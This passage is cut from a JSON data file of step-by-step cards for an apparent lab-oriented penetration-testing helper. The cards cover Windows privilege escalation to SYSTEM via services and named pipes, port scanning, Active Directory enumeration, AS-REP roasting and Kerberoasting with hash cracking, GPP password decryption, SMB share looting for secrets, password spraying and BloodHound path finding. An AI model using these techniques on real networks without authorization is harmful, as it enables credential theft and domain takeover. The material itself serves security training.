        "[SC] ChangeServiceConfig SUCCESS followed by your payload connecting back as SYSTEM."
      ],
      "win": "The reconfigured service restarts and executes your payload as SYSTEM.",
      "mistakes": [
        "Forgetting the required space after binPath= (sc.exe requires `binPath= \"...\"`)."
      ]
    }
  ],
  "windows-namedpipe-impersonation": [
    {
      "when": "Without SeImpersonate directly: impersonate a client on your named pipe.",
      "land": [
        "A client that connects to your pipe gives you its token. SeImpersonate shortcuts this."
      ],
      "look": [
        "The impersonation approach for this box."
      ],
      "win": "A named-pipe path is viable.",
      "mistakes": [
        "Forgetting you still need the right privilege to impersonate."
      ]
    },
    {
      "when": "Create the pipe server.",
      "land": [
        "Create the pipe server (a PrintSpoofer or GodPotato-style helper, or your own) and wait for a connection."
      ],
      "look": [
        "The pipe listening."
      ],
      "win": "The pipe server is up.",
      "mistakes": [
        "Naming the pipe something the coercion target will not hit."
      ]
    },
    {
      "when": "Coerce a privileged client.",
      "land": [
        "Coerce a privileged client onto the pipe: a service you can reconfigure, a scheduled task, or the spooler."
      ],
      "look": [
        "A SYSTEM client connecting to the pipe."
      ],
      "win": "A privileged client connects.",
      "mistakes": [
        "No trigger to bring a privileged client to the pipe."
      ]
    },
    {
      "when": "Impersonate.",
      "land": [
        "After ImpersonateNamedPipeClient and DuplicateTokenEx you run as the client."
      ],
      "look": [
        "nt authority\\system."
      ],
      "win": "You run as the SYSTEM client.",
      "mistakes": [
        "Dropping the token before you spawn your payload."
      ]
    }
  ],
  "nmap-fast-open-ports": [
    {
      "when": "The very first scan on a new target.",
      "land": [
        "Full TCP range, fast. Run it first so every later move knows the open ports."
      ],
      "look": [
        "The open-port list. 88, 389 and 445 together scream domain controller."
      ],
      "win": "You have the open TCP ports.",
      "mistakes": [
        "Jumping to -sC -sV on all 65535 ports instead of discovering first."
      ]
    },
    {
      "when": "When you want discovery faster.",
      "land": [
        "rustscan finds the open ports, then hands them to nmap after the --."
      ],
      "look": [
        "Open ports, then nmap detail on just those."
      ],
      "win": "Fast discovery feeding a targeted nmap.",
      "mistakes": [
        "Rustscanning so aggressively you miss ports on a rate-limited host."
      ]
    },
    {
      "when": "When you want raw packet-rate TCP discovery across all 65,535 ports (remember to pass -e tun0 on VPN labs).",
      "land": [
        "Sweeps all TCP ports at 1000 packets/sec and writes grepable output for Obol to parse."
      ],
      "look": [
        "Discovered open port lines across high and non-standard port numbers."
      ],
      "win": "All open TCP ports are discovered and written to masscan.gnmap.",
      "mistakes": [
        "Running masscan over a VPN without -e tun0, or setting --rate too high and dropping packets."
      ]
    },
    {
      "when": "A quieter initial pass.",
      "land": [
        "The top-ports scan is less noisy and usually adequate first."
      ],
      "look": [
        "Common open ports."
      ],
      "win": "A quick, quiet port list.",
      "mistakes": [
        "Trusting it to find a service on a high, unusual port."
      ]
    },
    {
      "when": "Fastest possible triage.",
      "land": [
        "Extremely quick, to get moving. Not a substitute for the full sweep."
      ],
      "look": [
        "The most common ports in seconds."
      ],
      "win": "An instant first look.",
      "mistakes": [
        "Treating this as the complete scan."
      ]
    }
  ],
  "nmap-version-scripts": [
    {
      "when": "After discovery, to fingerprint only the open ports.",
      "land": [
        "Default scripts and version detection against just the discovered ports."
      ],
      "look": [
        "Service versions and default-script findings, the aim for every later move."
      ],
      "win": "You know the services and versions.",
      "mistakes": [
        "Running it against all ports instead of the discovered set."
      ]
    },
    {
      "when": "When -sV is unclear.",
      "land": [
        "More intensive version fingerprinting."
      ],
      "look": [
        "A clearer version string."
      ],
      "win": "The version resolves.",
      "mistakes": [
        "Stopping at an ambiguous banner."
      ]
    },
    {
      "when": "An aggressive lab pass.",
      "land": [
        "-A bundles OS detection, scripts, version and traceroute. Noisier."
      ],
      "look": [
        "A full picture at once."
      ],
      "win": "Everything in one scan.",
      "mistakes": [
        "Using -A on a monitored or real target."
      ]
    }
  ],
  "nmap-vuln-scripts": [
    {
      "when": "To check the open ports for known vulns.",
      "land": [
        "The NSE vuln category against the confirmed-open ports."
      ],
      "look": [
        "A flagged CVE worth chasing (verify before trusting it)."
      ],
      "win": "A vuln lead from NSE.",
      "mistakes": [
        "Trusting an NSE \"VULNERABLE\" without confirming it."
      ]
    }
  ],
  "nmap-udp-top": [
    {
      "when": "When TCP is quiet and UDP services might matter.",
      "land": [
        "A top-UDP scan. Needs root and is slow, but finds SNMP, DNS and the like."
      ],
      "look": [
        "Open UDP (SNMP 161, DNS 53)."
      ],
      "win": "UDP services surface.",
      "mistakes": [
        "Expecting it to be fast. UDP scanning is slow."
      ]
    },
    {
      "when": "A focused UDP list.",
      "land": [
        "A hand-picked list (DNS, DHCP, TFTP, Kerberos, NTP, NetBIOS, SNMP, VPN)."
      ],
      "look": [
        "The high-value UDP ports."
      ],
      "win": "Key UDP services checked quickly.",
      "mistakes": [
        "Scanning all 65535 UDP ports, which never finishes."
      ]
    }
  ],
  "ad-dc-identify": [
    {
      "when": "First AD step: confirm the DC and the domain.",
      "land": [
        "An nxc LDAP smoke test verifies LDAP and reveals the domain and hostname."
      ],
      "look": [
        "The domain name and DC hostname."
      ],
      "win": "The domain and DC are confirmed.",
      "mistakes": [
        "Skipping this. Everything downstream needs the domain and base DN."
      ]
    },
    {
      "when": "From the LDAP banner.",
      "land": [
        "The banner leaks the domain and hostname with no creds."
      ],
      "look": [
        "Domain and hostname in the banner."
      ],
      "win": "You learn the domain for free.",
      "mistakes": [
        "Overlooking the banner line."
      ]
    },
    {
      "when": "Once you know the domain.",
      "land": [
        "SRV records pin which host is the DC. Skip this until you know the domain."
      ],
      "look": [
        "The DC SRV records."
      ],
      "win": "The DC is named via DNS.",
      "mistakes": [
        "Running it before you have the domain."
      ]
    },
    {
      "when": "From the port pattern.",
      "land": [
        "88 plus 389 plus 445 together is all but conclusive for a DC."
      ],
      "look": [
        "Kerberos, LDAP and SMB open on one host."
      ],
      "win": "The port pattern confirms a DC.",
      "mistakes": [
        "Missing it because you only looked at 445."
      ]
    }
  ],
  "ad-anon-ldap-enum": [
    {
      "when": "First probe against port 389/636: confirm the domain name, base DN, and whether anonymous LDAP bind is permitted.",
      "land": [
        "Run the switchless nxc ldap check first; a [+] line means anonymous bind is open and --users will work."
      ],
      "look": [
        "The domain FQDN, DC hostname, and a [+] anonymous bind confirmation."
      ],
      "win": "Anonymous LDAP bind and domain naming context are confirmed.",
      "mistakes": [
        "Running heavy LDAP queries before checking whether the DC requires authentication."
      ]
    },
    {
      "when": "Try a free anonymous LDAP dump before you have any creds.",
      "land": [
        "nxc does the whole anonymous LDAP dump in one line, descriptions and all."
      ],
      "look": [
        "Usernames and descriptions. Read descriptions closely, lab authors hide passwords there."
      ],
      "win": "An anonymous dump of users and descriptions.",
      "mistakes": [
        "Not reading the description fields."
      ]
    },
    {
      "when": "Test whether anonymous bind is allowed.",
      "land": [
        "If naming contexts come back, the bind is permitted."
      ],
      "look": [
        "Naming contexts in the response."
      ],
      "win": "Anonymous bind confirmed.",
      "mistakes": [
        "Assuming it is blocked without testing."
      ]
    },
    {
      "when": "Pull users and descriptions.",
      "land": [
        "Retrieve usernames and descriptions, and read each one."
      ],
      "look": [
        "A \"Default pwd:\" or similar in a description."
      ],
      "win": "A description leaks a credential hint.",
      "mistakes": [
        "Skimming past the descriptions."
      ]
    },
    {
      "when": "Enumerate group membership.",
      "land": [
        "Group membership exposes admin and service accounts to target later."
      ],
      "look": [
        "Members of Domain Admins and other juicy groups."
      ],
      "win": "High-value accounts are named.",
      "mistakes": [
        "Ignoring nested group membership."
      ]
    },
    {
      "when": "A friendlier wrapper.",
      "land": [
        "-U lists every user object with its UPN (the mail-style name)."
      ],
      "look": [
        "UPNs for the user list."
      ],
      "win": "A clean user list with UPNs.",
      "mistakes": [
        "Confusing the UPN with the sAMAccountName."
      ]
    },
    {
      "when": "Dump everything.",
      "land": [
        "Every object: OUs, groups, computers, service accounts. Service-account names hint at SPNs to roast."
      ],
      "look": [
        "Service accounts and computer objects."
      ],
      "win": "A full directory dump.",
      "mistakes": [
        "Drowning in output instead of grepping for accounts."
      ]
    },
    {
      "when": "HANDOFF: build the reusable userlist.",
      "land": [
        "Boil the nxc table into a tidy userlist (username is in column 5). This becomes the userlist every later move reuses."
      ],
      "look": [
        "A clean loot/users.txt."
      ],
      "win": "The reusable userlist is built.",
      "mistakes": [
        "Grabbing the wrong column for the username."
      ]
    }
  ],
  "ldap-deep-enum": [
    {
      "when": "With a base DN, pull every description.",
      "land": [
        "Admins leave \"Default pwd:\" and service accounts describe themselves."
      ],
      "look": [
        "Credential hints in descriptions."
      ],
      "win": "A description yields a lead.",
      "mistakes": [
        "Not scoping to the right base DN."
      ]
    },
    {
      "when": "A targeted admin query.",
      "land": [
        "Scope to protected or admin accounts. Change the filter to pivot."
      ],
      "look": [
        "Admin and protected accounts."
      ],
      "win": "The admin set is enumerated.",
      "mistakes": [
        "Writing an LDAP filter with the wrong syntax."
      ]
    },
    {
      "when": "Full inventory for breadth.",
      "land": [
        "The full user and group inventory, with the handoff one-liner to build the list."
      ],
      "look": [
        "Everything, then a clean list."
      ],
      "win": "A complete inventory plus a userlist.",
      "mistakes": [
        "Not saving the output for the handoff."
      ]
    },
    {
      "when": "The raw ldapsearch form.",
      "land": [
        "Scoped to the base DN. Drop -D and -w for an anonymous bind."
      ],
      "look": [
        "Raw directory entries."
      ],
      "win": "A raw scoped dump.",
      "mistakes": [
        "Wrong base DN. Use the one from the DC-identify card."
      ]
    }
  ],
  "ad-user-enum": [
    {
      "when": "Build a user list with no creds.",
      "land": [
        "RID cycling over a null or guest session. A full list, no auth."
      ],
      "look": [
        "Domain usernames by RID."
      ],
      "win": "A no-cred user list.",
      "mistakes": [
        "Assuming the null session is allowed without testing."
      ]
    },
    {
      "when": "Validate usernames via Kerberos.",
      "land": [
        "kerbrute userenum is quick and fairly stealthy. Real accounts return no error or a pre-auth-required."
      ],
      "look": [
        "Valid accounts (no \"unknown principal\")."
      ],
      "win": "Valid usernames confirmed.",
      "mistakes": [
        "Spraying passwords here. This is enumeration only."
      ]
    },
    {
      "when": "RPC null session.",
      "land": [
        "User enumeration over RPC via a null session."
      ],
      "look": [
        "Domain users over RPC."
      ],
      "win": "Users via RPC.",
      "mistakes": [
        "Giving up when SMB null is blocked but RPC is not."
      ]
    },
    {
      "when": "Hands-on null session.",
      "land": [
        "The manual null-session equivalent (rpcclient enumdomusers)."
      ],
      "look": [
        "The user list."
      ],
      "win": "Users enumerated by hand.",
      "mistakes": [
        "Forgetting the -U \"\" -N for the null bind."
      ]
    },
    {
      "when": "HANDOFF: build users.txt.",
      "land": [
        "Turn kerbrute output into loot/users.txt, the userlist every later move reuses."
      ],
      "look": [
        "A clean user list."
      ],
      "win": "The reusable userlist is built.",
      "mistakes": [
        "Leaving the kerbrute formatting noise in the file."
      ]
    }
  ],
  "asrep-roast": [
    {
      "when": "No creds: try AS-REP roasting the whole list.",
      "land": [
        "Each user gets tried. The roastable ones (no pre-auth) return a hash."
      ],
      "look": [
        "A $krb5asrep$ hash."
      ],
      "win": "A roastable account yields a hash.",
      "mistakes": [
        "Not having a userlist first."
      ]
    },
    {
      "when": "From a Windows foothold (Rubeus).",
      "land": [
        "Finds DONT_REQUIRE_PREAUTH accounts and roasts them. /format:john is optional."
      ],
      "look": [
        "Roasted hashes."
      ],
      "win": "Rubeus roasts the pre-auth-disabled accounts.",
      "mistakes": [
        "Mismatching the hash format to your cracker."
      ]
    },
    {
      "when": "Bulk roast with impacket.",
      "land": [
        "Each pre-auth-disabled account in the list produces a $krb5asrep$23$ hash."
      ],
      "look": [
        "Hashes for the list."
      ],
      "win": "A bulk roast completes.",
      "mistakes": [
        "Running without the userlist."
      ]
    },
    {
      "when": "One account.",
      "land": [
        "The single-account form, when enumeration flagged one suspect."
      ],
      "look": [
        "One hash."
      ],
      "win": "The suspect is roasted.",
      "mistakes": [
        "Typing the username wrong."
      ]
    },
    {
      "when": "Crack it with hashcat.",
      "land": [
        "Mode 18200 on your box. rockyou with the best64 rules is usual. The Workbench Hash ID confirms the mode."
      ],
      "look": [
        "A cracked password."
      ],
      "win": "The AS-REP cracks.",
      "mistakes": [
        "Wrong mode."
      ]
    },
    {
      "when": "Crack it with john.",
      "land": [
        "john recognizes krb5asrep itself, no mode number to look up."
      ],
      "look": [
        "A cracked password."
      ],
      "win": "john cracks it.",
      "mistakes": [
        "Using an old john without jumbo."
      ]
    },
    {
      "when": "HANDOFF: dedupe before cracking.",
      "land": [
        "Remove duplicates (repeats only waste GPU), then crack."
      ],
      "look": [
        "A deduped hash file."
      ],
      "win": "A clean file to crack.",
      "mistakes": [
        "Cracking the same hash several times."
      ]
    }
  ],
  "crack-asrep": [
    {
      "when": "Crack roasted AS-REP hashes.",
      "land": [
        "Mode 18200. obol saved them to the hashfile."
      ],
      "look": [
        "A cracked password."
      ],
      "win": "The AS-REP cracks.",
      "mistakes": [
        "Wrong mode.",
        "hashcat exits with `CL_PLATFORM_NOT_FOUND` on a VM with no GPU. Fix: `sudo apt install -y pocl-opencl-icd` (the Loadout arsenal now does this), or run the john line below, no GPU needed."
      ]
    },
    {
      "when": "Check the potfile.",
      "land": [
        "Inspect already-cracked hashes (user:password) without re-launching."
      ],
      "look": [
        "Previously cracked creds."
      ],
      "win": "You read prior results.",
      "mistakes": [
        "Re-running a crack you already finished."
      ]
    },
    {
      "when": "john --show.",
      "land": [
        "john identifies krb5asrep itself, and --show reads the output."
      ],
      "look": [
        "Cracked creds."
      ],
      "win": "john shows the results.",
      "mistakes": [
        "Forgetting --show reads, it does not crack."
      ]
    }
  ],
  "crack-tgs": [
    {
      "when": "Crack Kerberoast hashes.",
      "land": [
        "Mode 13100. obol saved them to the hashfile."
      ],
      "look": [
        "A cracked service-account password."
      ],
      "win": "The TGS cracks.",
      "mistakes": [
        "Wrong mode."
      ]
    },
    {
      "when": "Check the potfile.",
      "land": [
        "Review already-cracked hashes without re-launching."
      ],
      "look": [
        "Previously cracked creds."
      ],
      "win": "You read prior results.",
      "mistakes": [
        "Re-running a finished crack."
      ]
    },
    {
      "when": "john --show.",
      "land": [
        "john recognizes krb5tgs automatically."
      ],
      "look": [
        "Cracked creds."
      ],
      "win": "john shows the results.",
      "mistakes": [
        "Confusing --show with a crack run."
      ]
    },
    {
      "when": "Roasted ticket uses Kerberos 5 TGS-REP etype 17 (AES-128).",
      "land": [
        "hashcat -m 19600 with rockyou. Used when the service account enforces AES-128 encryption."
      ],
      "look": [
        "Cracked AES-128 service-account password."
      ],
      "win": "The AES-128 TGS ticket cracks.",
      "mistakes": [
        "Using mode 13100 on an AES ticket. Check the header prefix ($krb5tgs$17$)."
      ]
    },
    {
      "when": "Roasted ticket uses Kerberos 5 TGS-REP etype 18 (AES-256).",
      "land": [
        "hashcat -m 19700 with rockyou. Used when the service account ticket starts with $krb5tgs$18$."
      ],
      "look": [
        "Cracked AES-256 service-account password."
      ],
      "win": "The AES-256 TGS ticket cracks.",
      "mistakes": [
        "Using mode 13100 on an AES ticket. Check the header prefix ($krb5tgs$18$)."
      ]
    }
  ],
  "gpp-passwords": [
    {
      "when": "First choice when a readable share (such as Replication or SYSVOL) is exposed over a null session.",
      "land": [
        "Recursively downloads all readable files from the discovered share into your working directory so you can grep for Group Policy Preferences XML files (Groups.xml, Services.xml, ScheduledTasks.xml)."
      ],
      "look": [
        "Downloaded Groups.xml, Services.xml, ScheduledTasks.xml, or DataSources.xml files containing a cpassword attribute."
      ],
      "win": "You pull the GPP XML files locally from the readable share.",
      "mistakes": [
        "Relying only on nxc -M gpp_password, which hardcodes SYSVOL and silently skips custom shares like Replication."
      ]
    },
    {
      "when": "After downloading XML files from SYSVOL or a custom share like Replication with smbclient.",
      "land": [
        "Searches every downloaded XML file for the cpassword attribute so Obol can extract and decrypt it."
      ],
      "look": [
        "userName=\"...\" and cpassword=\"...\" inside Groups.xml, Services.xml, or ScheduledTasks.xml."
      ],
      "win": "grep locates the exact XML line containing cpassword.",
      "mistakes": [
        "Searching only Groups.xml and missing Services.xml or ScheduledTasks.xml."
      ]
    },
    {
      "when": "Decrypt a cpassword extracted from a GPP XML file.",
      "land": [
        "gpp-decrypt decrypts the AES-encrypted cpassword value using Microsoft's publicly disclosed static key."
      ],
      "look": [
        "The cleartext password."
      ],
      "win": "The cpassword decrypts into a usable plaintext password.",
      "mistakes": [
        "Pasting extra whitespace into the cpassword."
      ]
    },
    {
      "when": "Once you hold a domain credential and want to recursively pull files from an authenticated share.",
      "land": [
        "Recursively downloads all accessible files from the target share using your domain credentials."
      ],
      "look": [
        "Groups.xml or ScheduledTasks.xml downloaded into your local directory."
      ],
      "win": "You retrieve GPP XML files from an authenticated share.",
      "mistakes": [
        "Forgetting to check custom shares alongside SYSVOL after authenticating."
      ]
    },
    {
      "when": "When SYSVOL itself is readable over a null session.",
      "land": [
        "nxc spiders SYSVOL for Groups.xml and friends. The cpassword is reversible with a public key."
      ],
      "look": [
        "A cpassword value, which is always decryptable."
      ],
      "win": "A GPP password is recovered from SYSVOL.",
      "mistakes": [
        "Running -M gpp_password when SYSVOL is not readable and the GPP XML lives on a custom share like Replication."
      ]
    },
    {
      "when": "Once you hold any domain credential, to spider SYSVOL for Group Policy Preferences cpassword XML files.",
      "land": [
        "Most DCs block null sessions on SYSVOL but allow any authenticated domain user to read it; nxc finds and decrypts cpassword automatically."
      ],
      "look": [
        "Found cpassword and decrypted cleartext user/password lines in the module output."
      ],
      "win": "Authenticated SYSVOL spider recovers and decrypts a GPP password.",
      "mistakes": [
        "Only checking GPP anonymously and forgetting to re-run once you get a standard domain user."
      ]
    },
    {
      "when": "When you prefer Impacket's dedicated GPP spider and decrypter targeting the discovered share over SMB.",
      "land": [
        "Connects to the specified share, locates every Group Policy Preferences XML file, and decrypts cpassword values."
      ],
      "look": [
        "Decrypted username and password pairs printed from GPP XML files."
      ],
      "win": "impacket-Get-GPPPassword extracts and decrypts the GPP credential.",
      "mistakes": []
    }
  ],
  "smb-share-inventory": [
    {
      "when": "First choice when a custom readable share (such as Replication or Backups) appears over a null session.",
      "land": [
        "Recursively lists every directory and file on the target share over an anonymous session using smbclient."
      ],
      "look": [
        "Groups.xml, Services.xml, ScheduledTasks.xml, web.config, .ini, or backup archives inside nested directories."
      ],
      "win": "The full directory tree of the custom share prints and Obol catalogs discovered files.",
      "mistakes": [
        "Relying only on nxc -M gpp_password, which checks SYSVOL by default and skips custom shares like Replication."
      ]
    },
    {
      "when": "When recursive listing reveals Group Policy Preferences XML files on a custom share over a null session.",
      "land": [
        "Disables interactive prompts, enables recursion, and downloads Groups.xml, Services.xml, and ScheduledTasks.xml into your working directory."
      ],
      "look": [
        "getting file lines confirming the XML files were saved locally, then grep them for cpassword."
      ],
      "win": "GPP XML files are downloaded to Kali so you can extract and decrypt cpassword.",
      "mistakes": [
        "Forgetting prompt OFF before mget, which stalls waiting for interactive y/n confirmation."
      ]
    },
    {
      "when": "Once you hold a valid username and password and want to recursively list a restricted share.",
      "land": [
        "Connects to the share with credentials and runs recurse; ls to print the full file tree."
      ],
      "look": [
        "Configuration files, scripts, backups, or user profile folders that were hidden from null sessions."
      ],
      "win": "The authenticated share tree prints and Obol indexes any discovered files.",
      "mistakes": [
        "Not re-enumerating shares after capturing your first domain credential."
      ]
    },
    {
      "when": "Inventory all readable shares automatically over a null session.",
      "land": [
        "Spiders every readable share over a null session with spider_plus and writes a JSON inventory to /tmp/nxc_hosted/nxc_spider_plus/."
      ],
      "look": [
        "Readable shares with configs, XML files, or scripts."
      ],
      "win": "A share inventory with null auth.",
      "mistakes": [
        "Not re-checking once you hold a credential."
      ]
    },
    {
      "when": "Inventory all readable shares automatically once you hold a credential.",
      "land": [
        "An authenticated spider reaches far more shares than a null session."
      ],
      "look": [
        "More readable shares and sensitive files."
      ],
      "win": "A fuller inventory across all authenticated shares.",
      "mistakes": [
        "Forgetting to re-spider after getting a credential."
      ]
    },
    {
      "when": "Manual recursive listing across all shares via smbmap.",
      "land": [
        "READ ONLY marks accessible shares. Obol parses the recursive tree into loot.files."
      ],
      "look": [
        "Accessible shares and nested credential-bearing files."
      ],
      "win": "A manual recursive share list.",
      "mistakes": [
        "Overlooking a non-default share name."
      ]
    },
    {
      "when": "Quick check for GPP passwords specifically inside the standard SYSVOL share.",
      "land": [
        "Runs NetExec's gpp_password module against SYSVOL."
      ],
      "look": [
        "Decrypted username and cpassword pairs printed from SYSVOL policies."
      ],
      "win": "NetExec prints the decrypted GPP account and password.",
      "mistakes": [
        "Assuming no GPP passwords exist when -M gpp_password returns nothing on a host whose XML files live on a custom share like Replication."
      ]
    },
    {
      "when": "After extracting a raw AES-256 cpassword string from Groups.xml, Services.xml, or ScheduledTasks.xml.",
      "land": [
        "Runs gpp-decrypt on the cpassword string using Microsoft's published static AES key."
      ],
      "look": [
        "The decrypted cleartext password printed on stdout."
      ],
      "win": "gpp-decrypt prints the cleartext password and Obol pairs it with the discovered username.",
      "mistakes": [
        "Including quotes or trailing XML attributes in the cpassword argument."
      ]
    }
  ],
  "smb-share-browse-download": [
    {
      "when": "When a non-default SMB share (such as Replication, Backups, or Department) is readable over an anonymous/null session.",
      "land": [
        "Connects anonymously with smbclient -N (or runs prompt OFF; recurse ON; mget * to mirror the entire share locally)."
      ],
      "look": [
        "Downloaded XML policies (Groups.xml), scripts (.ps1, .bat), configuration files (web.config, .env), or backup archives."
      ],
      "win": "All readable files from the share are downloaded into your Kali workspace for inspection.",
      "mistakes": [
        "Listing only the top-level directory and missing files buried three folders deep under domain policy GUIDs."
      ]
    },
    {
      "when": "When you hold valid credentials and want to browse a restricted share interactively.",
      "land": [
        "Opens an interactive authenticated smbclient session on the target share."
      ],
      "look": [
        "User profile directories, internal IT scripts, or application backups."
      ],
      "win": "An interactive smb:\\> prompt opens on the restricted share.",
      "mistakes": [
        "Forgetting to run prompt OFF and recurse ON inside smbclient before running mget *."
      ]
    },
    {
      "when": "When you want to bulk-download an entire anonymous share tree in one non-interactive command.",
      "land": [
        "Runs smbclient -N with prompt OFF; recurse ON; mget * to pull every readable file into your current directory."
      ],
      "look": [
        "getting file lines for XML, INI, config, or script files that may hold credentials."
      ],
      "win": "The entire anonymous share structure is mirrored locally.",
      "mistakes": [
        "Running mget * from a cluttered directory instead of a dedicated loot/ or share subfolder."
      ]
    },
    {
      "when": "When you want to bulk-download an entire authenticated share tree in one non-interactive command.",
      "land": [
        "Runs authenticated smbclient with prompt OFF; recurse ON; mget * to pull all files from the share."
      ],
      "look": [
        "Configuration files, KeePass databases (.kdbx), SSH keys, or PowerShell transcripts."
      ],
      "win": "All readable files from the authenticated share are downloaded locally.",
      "mistakes": [
        "Running a full recursive mget against C$ or Users instead of targeting the specific custom share or subfolder."
      ]
    },
    {
      "when": "When you already know the exact path to a file on the share and want to download just that file.",
      "land": [
        "Uses smbclient -c 'get <remote_path> <local_path>' to pull a single file directly."
      ],
      "look": [
        "Confirmation that the file was transferred and saved to your local filename."
      ],
      "win": "The target file is saved locally without spidering the rest of the share.",
      "mistakes": [
        "Leaving unquoted backslashes or spaces in the remote path."
      ]
    },
    {
      "when": "When you prefer smbmap's one-line --download flag to pull a specific file.",
      "land": [
        "Runs smbmap --download '<share>/<remote_path>' to fetch the target file into your working directory."
      ],
      "look": [
        "Confirmation that smbmap downloaded and saved the file locally."
      ],
      "win": "smbmap downloads the requested file in one command.",
      "mistakes": [
        "Omitting the share name prefix from the --download path."
      ]
    }
  ],
  "spider-secrets": [
    {
      "when": "Filter spidered shares for secrets.",
      "land": [
        "spider_plus with a PATTERN filter downloads only the credential-bearing files."
      ],
      "look": [
        "config, .xml, .kdbx or .ps1 files with secrets."
      ],
      "win": "Secret files pulled from shares.",
      "mistakes": [
        "Downloading every file instead of filtering."
      ]
    },
    {
      "when": "Grep inside files.",
      "land": [
        "--content searches INSIDE files for the regex."
      ],
      "look": [
        "password=, connectionstring and similar."
      ],
      "win": "A secret inside a share file.",
      "mistakes": [
        "A regex too narrow to catch the variant in use."
      ]
    },
    {
      "when": "Offline fallback.",
      "land": [
        "grep the saved JSON manifest from a prior plain spider."
      ],
      "look": [
        "Interesting filenames."
      ],
      "win": "A lead from the manifest.",
      "mistakes": [
        "Forgetting you already spidered and have the manifest."
      ]
    }
  ],
  "kerberoast": [
    {
      "when": "With any domain credential, roast the SPNs.",
      "land": [
        "One line roasts every SPN account into a hashcat-ready file."
      ],
      "look": [
        "$krb5tgs$ hashes."
      ],
      "win": "SPN accounts are roasted.",
      "mistakes": [
        "Expecting it to work without a valid credential."
      ]
    },
    {
      "when": "From a Windows session (Rubeus).",
      "land": [
        "Roasts all SPN accounts off your session, no password on the command line."
      ],
      "look": [
        "Roasted hashes."
      ],
      "win": "Rubeus roasts the SPNs.",
      "mistakes": [
        "Typing the password on the command line needlessly."
      ]
    },
    {
      "when": "impacket GetUserSPNs.",
      "land": [
        "Asks for tickets across every SPN account. Crackable ones return $krb5tgs$."
      ],
      "look": [
        "Hashes to crack."
      ],
      "win": "Tickets requested and returned.",
      "mistakes": [
        "Clock skew breaking the request (see the clock-skew fix)."
      ]
    },
    {
      "when": "Crack them.",
      "land": [
        "Mode 13100. Service-account passwords are often stale and weak. Hash ID confirms the mode."
      ],
      "look": [
        "Cracked service-account passwords."
      ],
      "win": "A TGS cracks.",
      "mistakes": [
        "Wrong mode."
      ]
    },
    {
      "when": "Targeted Kerberoast (a 0xdf go-to).",
      "land": [
        "Roast only accounts you can write to (GenericAll), by setting an SPN first."
      ],
      "look": [
        "A roast you created via write access."
      ],
      "win": "A targeted roast lands.",
      "mistakes": [
        "Forgetting to remove the SPN you set afterward."
      ]
    },
    {
      "when": "HANDOFF: dedupe.",
      "land": [
        "Strip duplicates (nxc and impacket append on repeat runs) before cracking."
      ],
      "look": [
        "A clean roast file."
      ],
      "win": "A deduped file to crack.",
      "mistakes": [
        "Cracking duplicate hashes."
      ]
    },
    {
      "when": "You found an AS-REP-roastable user (DONT_REQ_PREAUTH) whose hash did not crack, and you have an enumerated domain user list.",
      "land": [
        "Run impacket-GetUserSPNs with -no-preauth <asrep_user> and -usersfile <userlist> against -dc-host to request TGS tickets without a password."
      ],
      "look": [
        "$krb5tgs$23$*... hashes returned for any account in the user list that holds an SPN."
      ],
      "win": "Kerberoastable TGS hashes recovered without any cracked domain password.",
      "mistakes": [
        "Omitting the trailing slash after {{domain}}/ or passing an account that still requires Kerberos pre-authentication."
      ]
    }
  ],
  "password-spray": [
    {
      "when": "BEFORE spraying, pull the lockout policy.",
      "land": [
        "One attempt below the lockout threshold is your budget. Wait out the window between rounds."
      ],
      "look": [
        "The lockout threshold and the observation window."
      ],
      "win": "You know your safe attempt budget.",
      "mistakes": [
        "Spraying without checking lockout and locking the whole domain."
      ]
    },
    {
      "when": "Spray one password across all users.",
      "land": [
        "nxc removes duplicate targets and resumes smoothly. Use a seasonal or company-themed password."
      ],
      "look": [
        "A [+] on a hit."
      ],
      "win": "A reused password lands on an account.",
      "mistakes": [
        "Using more than one password per round."
      ]
    },
    {
      "when": "A Kerberos-driven spray.",
      "land": [
        "kerbrute passwordspray ties into your enumerated user list."
      ],
      "look": [
        "Valid user and password pairs."
      ],
      "win": "A Kerberos spray hits.",
      "mistakes": [
        "Ignoring the lockout window between rounds."
      ]
    },
    {
      "when": "From a Windows foothold.",
      "land": [
        "DomainPasswordSpray assembles the user list itself and respects lockout."
      ],
      "look": [
        "Hits from inside the domain."
      ],
      "win": "An on-host spray hits.",
      "mistakes": [
        "Ignoring fine-grained password policies on some OUs."
      ]
    }
  ],
  "bloodhound-collect": [
    {
      "when": "Collect the data for BloodHound, remotely, with a credential.",
      "land": [
        "Gathers everything into BloodHound-ready zips. Over a SOCKS tunnel, add the proxy flag."
      ],
      "look": [
        "Zip files written."
      ],
      "win": "Collection zips are produced.",
      "mistakes": [
        "Collecting without a credential."
      ]
    },
    {
      "when": "A complete remote collection.",
      "land": [
        "The zips are your evidence. Import them into BloodHound."
      ],
      "look": [
        "Complete zips."
      ],
      "win": "A full remote collection.",
      "mistakes": [
        "Collecting a partial method set and missing edges."
      ]
    },
    {
      "when": "Analyze in the GUI.",
      "land": [
        "Load the zips, run Shortest Paths to Domain Admins and the prebuilt queries."
      ],
      "look": [
        "A path from your account to Domain Admins."
      ],
      "win": "An attack path is found.",
      "mistakes": [
        "Not marking owned nodes, which hides shorter paths."
      ]
    },
    {
      "when": "From a Windows beachhead (SharpHound).",
      "land": [
        "Upload it, or run it in memory, then collect."
      ],
      "look": [
        "Zips from the foothold."
      ],
      "win": "On-host collection is done.",
      "mistakes": [
        "AV eating SharpHound (see the AMSI move)."
      ]
    },
    {
      "when": "Analyze the beachhead collection.",
      "land": [
        "Same GUI routine. Review the prebuilt queries."
      ],
      "look": [
        "A path to DA."
      ],
      "win": "A path from the on-host data.",
      "mistakes": [
        "Ignoring the prebuilt queries."
      ]
    },
    {
      "when": "Your own group memberships (no BloodHound).",
      "land": [
        "net group checks your direct memberships."
      ],
      "look": [
        "A privileged group you are in."
      ],
      "win": "A quick membership win.",
      "mistakes": [
        "Checking only the obvious groups."
      ]
    },
    {
      "when": "PowerView group recon.",
      "land": [
        "Dot-source PowerView, then list group members."
      ],
      "look": [
        "Members of a target group."
      ],
      "win": "Group membership enumerated.",
      "mistakes": [
        "Forgetting to dot-source PowerView first."
      ]
    },
    {
      "when": "Recursive group members.",
      "land": [
        "List a target group recursively (nested members)."
      ],
      "look": [
        "Nested members."
      ],
      "win": "Full membership including nesting.",
      "mistakes": [
        "Ignoring nested membership."
      ]
    },
    {
      "when": "ACEs on your user.",
      "land": [
        "Every ACE granted to you. WriteDacl, GenericAll or WriteOwner on the domain is a straight path."
      ],
      "look": [
        "A dangerous ACE in your favor."
      ],
      "win": "An abusable ACL is found.",
      "mistakes": [
